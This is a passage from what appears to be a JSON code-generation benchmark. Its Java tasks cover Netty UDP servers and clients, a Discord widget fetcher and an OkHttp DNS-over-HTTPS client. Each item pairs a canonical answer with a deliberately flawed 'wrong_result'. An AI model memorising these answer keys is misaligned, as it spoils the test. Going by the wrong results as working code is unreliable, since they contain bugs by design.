    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.common.backup.BackupManager;\nimport org.tron.common.es.ExecutorServiceManager;\nimport org.tron.common.parameter.CommonParameter;\nimport org.tron.p2p.stats.TrafficStats;\n\npublic class BackupServer implements AutoCloseable {\n\n  private CommonParameter commonParameter = CommonParameter.getInstance();\n  private int port = commonParameter.getBackupPort();\n  private BackupManager backupManager;\n  private Channel channel;\n  private volatile boolean shutdown = false;\n  private ExecutorService executor;\n\n  public BackupServer(final BackupManager backupManager) {\n    this.backupManager = backupManager;\n  }\n\n  public void initServer() {\n    if (port > 0 && commonParameter.getBackupMembers().size() > 0) {\n      executor = ExecutorServiceManager.newSingleThreadExecutor(\"BackupServer\");\n      executor.submit(() -> {\n        try {\n          start();\n        } catch (Exception e) {\n          logger.error(\"Start backup server failed, {}\", e);\n        }\n      });\n    }\n  }\n\n  private void start() throws Exception {\n    NioEventLoopGroup group = new NioEventLoopGroup(1);\n    try {\n      while (!shutdown) {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n            .channel(NioDatagramChannel.class)\n            .handler(new ChannelInitializer<NioDatagramChannel>() {\n              @Override\n              public void initChannel(NioDatagramChannel ch) throws Exception {\n                ch.pipeline().addLast(TrafficStats.udp);\n                ch.pipeline().addLast(new ProtobufVarint32LengthFieldPrepender());\n                ch.pipeline().addLast(new ProtobufVarint32FrameDecoder());\n                ch.pipeline().addLast(new PacketDecoder());\n                MessageHandler messageHandler = new MessageHandler(ch, backupManager);\n                backupManager.setMessageHandler(messageHandler);\n                ch.pipeline().addLast(messageHandler);\n              }\n            });\n\n        channel = b.bind(port).sync().channel();\n        channel.closeFuture().sync();\n        if (shutdown) {\n          break;\n        }\n      }\n    } finally {\n      group.shutdownGracefully().sync();\n    }\n  }\n\n  @Override\n  public void close() {\n    shutdown = true;\n    backupManager.stop();\n    if (channel != null) {\n      try {\n        channel.close().await(10, TimeUnit.SECONDS);\n      } catch (Exception e) {\n        logger.warn(\"Closing backup server failed.\", e);\n      }\n    }\n    ExecutorServiceManager.shutdownAndAwaitTermination(executor, \"BackupServer\");\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "public class BackupServer implements AutoCloseable {\n    private final BackupManager backupManager;\n    private final int port;\n    private Channel channel;\n    private boolean shutdown;\n    private final ExecutorService executor;\n    private final CommonParameter commonParameter;\n\n    public BackupServer(BackupManager backupManager) {\n        this.backupManager = backupManager;\n        this.commonParameter = new CommonParameter();\n        this.port = commonParameter.getPort();\n        this.executor = Executors.newSingleThreadExecutor();\n        this.shutdown = false;\n    }\n\n    public void initServer() {\n        if (!shutdown) {\n            executor.execute(this::start);\n        }\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioDatagramChannel.class)\n                    .handler(new ChannelInitializer<NioDatagramChannel>() {\n                        @Override\n                        protected void initChannel(NioDatagramChannel ch) {\n                            ch.pipeline().addLast(new StringDecoder());\n                            ch.pipeline().addLast(new ChannelInboundHandlerAdapter() {\n                                @Override\n                                public void channelRead(ChannelHandlerContext ctx, Object msg) {\n                                    String message = (String) msg;\n                                    backupManager.processMessage(message);\n                                    ctx.fireChannelRead(msg);\n                                }\n                            });\n                        }\n                    });\n            channel = bootstrap.bind(port).sync().channel();\n            channel.closeFuture().await();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void close() {\n        shutdown = true;\n        if (channel != null) {\n            channel.close();\n        }\n        executor.shutdown();\n    }\n}"
  },
  {
    "Task_id": 234,
    "Instruction": "Task Description: Create a Java class that implements a UDP echo server using Netty framework, capable of receiving datagrams and echoing them back to the sender.\n\nClass Description: DatagramChannelEchoServer is a Netty-based UDP server that listens on a specified port, receives incoming datagrams, and echoes them back to the sender. The server handles network operations asynchronously and includes proper resource cleanup.\n\nAttributes:\n- group: [NioEventLoopGroup] - Handles I/O operations asynchronously\n- bootstrap: [Bootstrap] - Configures and initializes the Netty server\n- channelFuture: [ChannelFuture] - Represents the result of an asynchronous channel operation\n- DEFAULT_PORT: [int] - Default port number (7) if none specified\n\nMethods:\n- start([int port]) -> [void] - Starts the UDP server on the specified port, initializes Netty components, and binds to the port\n- shutdown() -> [void] - Gracefully shuts down the server and releases resources\n- main([String[] args]) -> [void] - Entry point that parses command line arguments and starts the server\n\nThe class should use NioDatagramChannel for UDP transport, enable SO_BROADCAST option, and include proper error handling and resource cleanup. The server should continue running until explicitly stopped, echoing all received datagrams back to their senders.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\n\npublic class DatagramChannelEchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n    private ChannelFuture channelFuture;\n\n    public void start(int port) throws Exception {\n        group = new NioEventLoopGroup();\n        \n        try {\n            bootstrap = new Bootstrap();\n            \n            bootstrap.group(group)\n                .channel(NioDatagramChannel.class)\n                .option(ChannelOption.SO_BROADCAST, true)\n                .handler(new DatagramChannelEchoServerHandler());\n            \n            channelFuture = bootstrap.bind(port).sync();\n            System.out.println(\"DatagramChannelEchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            \n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        DatagramChannelEchoServer server = new DatagramChannelEchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "public class DatagramChannelEchoServer {\n    private final NioEventLoopGroup group;\n    private Bootstrap bootstrap;\n    private ChannelFuture channelFuture;\n    private static final int DEFAULT_PORT = 7;\n\n    public DatagramChannelEchoServer() {\n        group = new NioEventLoopGroup();\n    }\n\n    public void start(int port) {\n        bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioDatagramChannel.class)\n                .option(ChannelOption.SO_BROADCAST, true)\n                .handler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) {\n                        ch.pipeline().addLast(new EchoHandler());\n                    }\n                });\n        try {\n            channelFuture = bootstrap.bind(port).sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        if (channelFuture != null) {\n            channelFuture.channel().close();\n        }\n        group.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                System.err.println(\"Invalid port number: \" + args[0]);\n                return;\n            }\n        }\n        DatagramChannelEchoServer server = new DatagramChannelEchoServer();\n        server.start(port);\n    }\n\n    private static class EchoHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof DatagramPacket) {\n                DatagramPacket packet = (DatagramPacket) msg;\n                ByteBuf buf = packet.content();\n                ctx.channel().writeAndFlush(buf, packet.sender());\n                buf.release();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework, with support for multiple transport types (NIO, Epoll, KQueue, IOUring) and graceful shutdown capabilities.\n\nClass Description: GeyserServer is a Netty-based UDP server implementation that handles network communication using the most optimal transport available on the system. It manages server lifecycle including binding to ports and graceful shutdown.\n\nAttributes:\n- TRANSPORT: [Transport] - Static final field holding the best available transport type\n- SHUTDOWN_QUIET_PERIOD_MS: [int] - Milliseconds to wait for quiet period during shutdown\n- SHUTDOWN_TIMEOUT_MS: [int] - Maximum milliseconds to wait for shutdown\n- geyser: [GeyserImpl] - Reference to the main Geyser implementation\n- group: [EventLoopGroup] - Parent event loop group for the server\n- childGroup: [EventLoopGroup] - Child event loop group for handling connections\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- playerGroup: [EventLoopGroup] - Event loop group for player connections\n- bootstrapFutures: [ChannelFuture[]] - Array of channel futures for server binding\n\nMethods:\n- GeyserServer([GeyserImpl geyser, int threadCount]) -> [void] - Constructor that initializes the server with specified thread count\n- bind([InetSocketAddress address]) -> [CompletableFuture<Void>] - Binds the server to the specified address and returns a future\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- createBootstrap() -> [ServerBootstrap] - Private method that creates and configures the server bootstrap\n- compatibleTransport() -> [Transport] - Static private method that detects the best available transport\n- isClassAvailable([String className]) -> [boolean] - Static private helper method to check class availability\n\nNested Types:\n- Transport: [record] - Holds transport-specific channel class and event loop group factory",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollDatagramChannel;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.kqueue.KQueue;\nimport io.netty.channel.kqueue.KQueueDatagramChannel;\nimport io.netty.channel.kqueue.KQueueEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramChannel;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUring;\nimport io.netty.incubator.channel.uring.IOUringDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUringEventLoopGroup;\nimport io.netty.util.concurrent.Future;\nimport org.cloudburstmc.netty.channel.raknet.RakChannelFactory;\nimport org.cloudburstmc.netty.channel.raknet.config.RakChannelOption;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.IntFunction;\n\npublic final class GeyserServer {\n    private static final Transport TRANSPORT = compatibleTransport();\n    private static final int SHUTDOWN_QUIET_PERIOD_MS = 100;\n    private static final int SHUTDOWN_TIMEOUT_MS = 500;\n\n    private final GeyserImpl geyser;\n    private EventLoopGroup group;\n    private EventLoopGroup childGroup;\n    private final ServerBootstrap bootstrap;\n    private EventLoopGroup playerGroup;\n    private ChannelFuture[] bootstrapFutures;\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = TRANSPORT.eventLoopGroupFactory().apply(1);\n        this.childGroup = TRANSPORT.eventLoopGroupFactory().apply(threadCount);\n        this.bootstrap = this.createBootstrap();\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        bootstrapFutures = new ChannelFuture[1];\n        ChannelFuture future = bootstrap.bind(address);\n        bootstrapFutures[0] = future;\n        return Bootstraps.allOf(bootstrapFutures);\n    }\n\n    public void shutdown() {\n        try {\n            Future<?> futureChildGroup = this.childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.childGroup = null;\n            Future<?> futureGroup = this.group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.group = null;\n            Future<?> futurePlayerGroup = this.playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.playerGroup = null;\n\n            futureChildGroup.sync();\n            futureGroup.sync();\n            futurePlayerGroup.sync();\n        } catch (InterruptedException e) {\n            GeyserImpl.getInstance().getLogger().severe(\"Exception in shutdown process\", e);\n        }\n        for (ChannelFuture f : bootstrapFutures) {\n            f.channel().closeFuture().syncUninterruptibly();\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        GeyserServerInitializer serverInitializer = new GeyserServerInitializer(this.geyser);\n        playerGroup = serverInitializer.getEventLoopGroup();\n\n        return new ServerBootstrap()\n                .channelFactory(RakChannelFactory.server(TRANSPORT.datagramChannel()))\n                .group(group, childGroup)\n                .childHandler(serverInitializer);\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.incubator.channel.uring.IOUring\")\n                && IOUring.isAvailable()\n                && Boolean.parseBoolean(System.getProperty(\"Geyser.io_uring\"))) {\n            return new Transport(IOUringDatagramChannel.class, IOUringEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.epoll.Epoll\") && Epoll.isAvailable()) {\n            return new Transport(EpollDatagramChannel.class, EpollEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.kqueue.KQueue\") && KQueue.isAvailable()) {\n            return new Transport(KQueueDatagramChannel.class, KQueueEventLoopGroup::new);\n        }\n\n        return new Transport(NioDatagramChannel.class, NioEventLoopGroup::new);\n    }\n\n    private record Transport(Class<? extends DatagramChannel> datagramChannel, IntFunction<EventLoopGroup> eventLoopGroupFactory) {\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "public record Transport(String name, Class<? extends DatagramChannel> channelClass, Function<Integer, EventLoopGroup> factory) {}\n\npublic class GeyserServer {\n    public static final Transport TRANSPORT;\n    public static final int SHUTDOWN_QUIET_PERIOD_MS = 1000;\n    public static final int SHUTDOWN_TIMEOUT_MS = 5000;\n    private final GeyserImpl geyser;\n    private final EventLoopGroup group;\n    private final EventLoopGroup childGroup;\n    private final EventLoopGroup playerGroup;\n    private final ServerBootstrap bootstrap;\n    private final ChannelFuture[] bootstrapFutures;\n\n    static {\n        TRANSPORT = compatibleTransport();\n    }\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = TRANSPORT.factory.apply(threadCount);\n        this.childGroup = TRANSPORT.factory.apply(threadCount);\n        this.playerGroup = TRANSPORT.factory.apply(threadCount);\n        this.bootstrap = createBootstrap();\n        this.bootstrapFutures = new ChannelFuture[0];\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        CompletableFuture<Void> future = new CompletableFuture<>();\n        bootstrapFutures = new ChannelFuture[]{bootstrap.bind(address)};\n        bootstrapFutures[0].addListener(f -> {\n            if (f.isSuccess()) {\n                future.complete(null);\n            } else {\n                future.completeExceptionally(f.cause());\n            }\n        });\n        return future;\n    }\n\n    public void shutdown() {\n        for (ChannelFuture future : bootstrapFutures) {\n            future.channel().close();\n        }\n        group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n        childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n        playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n    }\n\n    private ServerBootstrap createBootstrap() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(group)\n                 .channel(TRANSPORT.channelClass)\n                 .childGroup(childGroup)\n                 .childHandler(new ChannelInitializer<Channel>() {\n                     @Override\n                     protected void initChannel(Channel ch) {\n                         ch.pipeline().addLast(new DatagramPacketHandler(geyser));\n                     }\n                 })\n                 .option(ChannelOption.SO_REUSEADDR, true)\n                 .childOption(ChannelOption.SO_REUSEADDR, true);\n        return bootstrap;\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.channel.epoll.Epoll\")) {\n            return new Transport(\"Epoll\", EpollDatagramChannel.class, threads -> new EpollEventLoopGroup(threads));\n        } else if (isClassAvailable(\"io.netty.channel.kqueue.KQueue\")) {\n            return new Transport(\"KQueue\", KQueueDatagramChannel.class, threads -> new KQueueEventLoopGroup(threads));\n        } else if (isClassAvailable(\"io.netty.channel.uring.IOUring\")) {\n            return new Transport(\"IOUring\", IOUringDatagramChannel.class, threads -> new IOUringEventLoopGroup(threads));\n        } else {\n            return new Transport(\"NIO\", NioDatagramChannel.class, threads -> new NioEventLoopGroup(threads));\n        }\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 236,
    "Instruction": "Task Description: Create a Java class that implements a UDP client using Netty framework for sending and receiving datagram packets. The client should be able to start a connection, send messages to a specified host and port, handle console input for sending messages, and gracefully shutdown the connection.\n\nClass Description: DatagramChannelEchoClient is a Netty-based UDP client that establishes a connection to a specified host and port, sends messages via UDP datagrams, and can be controlled through console input. It manages network resources efficiently and provides clean shutdown capabilities.\n\nAttributes:\n- host: String - The target host address to which messages will be sent\n- port: int - The target port number on the host\n- group: EventLoopGroup - Netty event loop group for handling I/O operations\n- channel: Channel - The Netty channel used for UDP communication\n\nMethods:\n- DatagramChannelEchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Starts the UDP client by initializing Netty components and binding to the port\n- sendMessage(String message) -> void - Sends a message to the configured host and port via UDP\n- stop() -> void - Gracefully shuts down the client and releases resources\n- runConsoleInput() -> void - Reads input from console and sends it as messages until terminated",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\n\npublic final class DatagramChannelEchoClient {\n\n    private final String host;\n    private final int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioDatagramChannel.class)\n         .option(ChannelOption.SO_BROADCAST, true)\n         .handler(new DatagramChannelEchoClientHandler());\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n        System.out.println(\"DatagramChannelEchoClient\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        io.netty.buffer.ByteBuf buf = io.netty.buffer.Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(new io.netty.channel.socket.DatagramPacket(\n            buf, new InetSocketAddress(host, port)));\n        writeBuffer.clear();\n    }\n\n    public void stop() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void runConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + host);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + host);\n            System.exit(1);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramPacket;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.util.CharsetUtil;\nimport java.net.InetSocketAddress;\nimport java.util.Scanner;\n\npublic class DatagramChannelEchoClient {\n    private final String host;\n    private final int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioDatagramChannel.class)\n                    .handler(new ChannelInitializer<Channel>() {\n                        @Override\n                        protected void initChannel(Channel ch) {\n                            ch.pipeline().addLast(new SimpleChannelInboundHandler<DatagramPacket>() {\n                                @Override\n                                protected void channelRead0(ChannelHandlerContext ctx, DatagramPacket packet) {\n                                    System.out.println(\"Received: \" + packet.content().toString(CharsetUtil.UTF_8));\n                                }\n                            });\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            channel = future.channel();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void sendMessage(String message) {\n        if (channel == null || !channel.isActive()) {\n            return;\n        }\n        ByteBuf buf = Unpooled.copiedBuffer(message, CharsetUtil.UTF_8);\n        DatagramPacket packet = new DatagramPacket(buf, new InetSocketAddress(host, port));\n        channel.writeAndFlush(packet);\n    }\n\n    public void stop() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    public void runConsoleInput() {\n        Scanner scanner = new Scanner(System.in);\n        while (true) {\n            String line = scanner.nextLine();\n            if (line.equalsIgnoreCase(\"exit\")) {\n                break;\n            }\n            sendMessage(line);\n        }\n        scanner.close();\n    }\n}"
  },
  {
    "Task_id": 237,
    "Instruction": "Task Description: Create a utility class for retrieving Discord guild widget information using HTTP requests.\n\nClass Description: WidgetUtil is a utility class that provides functionality to fetch Discord guild widget data through REST API calls. It handles HTTP communication, response processing, and error handling for widget retrieval operations.\n\nAttributes:\nWIDGET_URL: [String] - The URL template for accessing Discord guild widget JSON data, using the default REST API base URL.\n\nMethods:\ngetWidget: [getWidget]([long guildId]) -> [Widget] - Retrieves the widget information for a specified Discord guild ID. Handles various HTTP response codes including success (200), not found (404), forbidden (403), and rate limiting (429). Throws RateLimitedException when rate limited and UncheckedIOException for IO errors. Returns null if the widget doesn't exist or is inaccessible.",
    "Canonical_solution": "import net.dv8tion.jda.api.entities.Widget;\nimport net.dv8tion.jda.api.exceptions.RateLimitedException;\nimport net.dv8tion.jda.api.requests.RestConfig;\nimport net.dv8tion.jda.api.utils.data.DataObject;\nimport net.dv8tion.jda.internal.entities.WidgetImpl;\nimport net.dv8tion.jda.internal.utils.Checks;\nimport net.dv8tion.jda.internal.utils.IOUtil;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n\nimport javax.annotation.Nonnull;\nimport javax.annotation.Nullable;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.UncheckedIOException;\n\npublic class WidgetUtil \n{\n    public static final String WIDGET_URL = RestConfig.DEFAULT_BASE_URL + \"guilds/%s/widget.json\";\n\n    @Nullable\n    public static Widget getWidget(long guildId) throws RateLimitedException\n    {\n        Checks.notNull(guildId, \"GuildId\");\n\n        OkHttpClient client = new OkHttpClient.Builder().build();\n        Request request = new Request.Builder()\n                    .url(String.format(WIDGET_URL, guildId))\n                    .method(\"GET\", null)\n                    .header(\"user-agent\", RestConfig.USER_AGENT)\n                    .header(\"accept-encoding\", \"gzip\")\n                    .build();\n\n        try (Response response = client.newCall(request).execute())\n        {\n            final int code = response.code();\n            InputStream data = IOUtil.getBody(response);\n\n            switch (code)\n            {\n                case 200:\n                    try (InputStream stream = data)\n                    {\n                        return new WidgetImpl(DataObject.fromJson(stream));\n                    }\n                    catch (IOException e)\n                    {\n                        throw new UncheckedIOException(e);\n                    }\n                case 400:\n                case 404:\n                    return null;\n                case 403:\n                    return new WidgetImpl(guildId);\n                case 429:\n                    long retryAfter;\n                    try (InputStream stream = data)\n                    {\n                        retryAfter = DataObject.fromJson(stream).getLong(\"retry_after\");\n                    }\n                    catch (Exception e)\n                    {\n                        retryAfter = 0;\n                    }\n                    throw new RateLimitedException(WIDGET_URL, retryAfter);\n                default:\n                    throw new IllegalStateException(\"An unknown status was returned: \" + code + \" \" + response.message());\n            }\n        }\n        catch (IOException e)\n        {\n            throw new UncheckedIOException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\n\npublic class WidgetUtil {\n    private static final String WIDGET_URL = \"https://discord.com/api/guilds/{guildId}/widget.json\";\n\n    private WidgetUtil() {\n        // Prevent instantiation\n    }\n\n    public static Widget getWidget(long guildId) throws RateLimitedException {\n        String url = String.format(WIDGET_URL, guildId);\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .GET()\n                .build();\n\n        try {\n            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());\n            int statusCode = response.statusCode();\n\n            if (statusCode == 200) {\n                ObjectMapper mapper = new ObjectMapper();\n                return mapper.readValue(response.body(), Widget.class);\n            } else if (statusCode == 404 || statusCode == 403) {\n                return null;\n            } else if (statusCode == 429) {\n                throw new RateLimitedException(\"Rate limited\");\n            } else {\n                throw new UncheckedIOException(new IOException(\"Unexpected status code: \" + statusCode));\n            }\n        } catch (IOException | InterruptedException e) {\n            throw new UncheckedIOException(e);\n        }\n    }\n}"
  },
  {
    "Task_id": 238,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using OkHttp library, supporting both regular and DNS-over-HTTPS (DoH) connections, with caching capabilities and custom DNS fallback mechanisms.\n\nClass Description: The HttpClient class provides static methods for performing HTTP GET and POST requests with configurable caching and DNS options. It maintains four different client configurations (regular/DoH with/without cache) and handles response processing with error checking.\n\nAttributes:\n- httpClient: [OkHttpClient] - Standard HTTP client without cache\n- httpClientDoH: [OkHttpClient] - HTTP client with DNS-over-HTTPS support\n- httpClientWithCache: [OkHttpClient] - HTTP client with caching enabled\n- httpClientWithCacheDoH: [OkHttpClient] - HTTP client with both caching and DoH\n- fallbackDNS: [FallBackDNS] - Custom DNS resolver with fallback functionality\n- doh: [boolean] - Flag indicating whether DoH is enabled\n\nMethods:\n- getHttpClient() -> [OkHttpClient] - Returns appropriate HTTP client based on DoH setting\n- getHttpClientWithCache() -> [OkHttpClient] - Returns cached HTTP client based on DoH setting\n- doHttpGet(String url, boolean allowCache) -> [byte[]] - Performs HTTP GET request and returns response body as bytes\n- doHttpPost(String url, String data, boolean allowCache) -> [byte[]] - Performs HTTP POST request with JSON payload and returns response body as bytes\n- followRedirects(OkHttpClient.Builder builder, boolean followRedirects) -> [OkHttpClient.Builder] - Configures redirect following behavior for client builder\n- checkNeedCaptchaAndroidacy(String url, int errorCode) -> [void] - Checks if Androidacy URL requires captcha\n- JsonRequestBody: [static inner class] - Custom RequestBody implementation for JSON data\n\nStatic Initialization Block:\n- Initializes all HTTP client configurations with timeout settings, proxy configuration, and DNS setup (including DoH fallback)",
    "Canonical_solution": "import android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.net.Uri;\nimport android.os.Handler;\nimport android.os.Looper;\n\nimport com.fox2code.mmm.MainApplication;\nimport com.fox2code.mmm.R;\nimport com.fox2code.mmm.androidacy.AndroidacyUtil;\n\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\n\nimport javax.net.ssl.SSLException;\n\nimport okhttp3.Cache;\nimport okhttp3.Dns;\nimport okhttp3.HttpUrl;\nimport okhttp3.MediaType;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport okhttp3.dnsoverhttps.DnsOverHttps;\nimport okhttp3.logging.HttpLoggingInterceptor;\nimport okio.BufferedSink;\nimport timber.log.Timber;\n\npublic class HttpClient {\n    private static final OkHttpClient httpClient;\n    private static final OkHttpClient httpClientDoH;\n    private static final OkHttpClient httpClientWithCache;\n    private static final OkHttpClient httpClientWithCacheDoH;\n    private static final FallBackDNS fallbackDNS;\n    private static boolean doh;\n\n    static {\n        MainApplication mainApplication = MainApplication.getINSTANCE();\n        OkHttpClient.Builder httpclientBuilder = new OkHttpClient.Builder();\n        httpclientBuilder.connectTimeout(5, 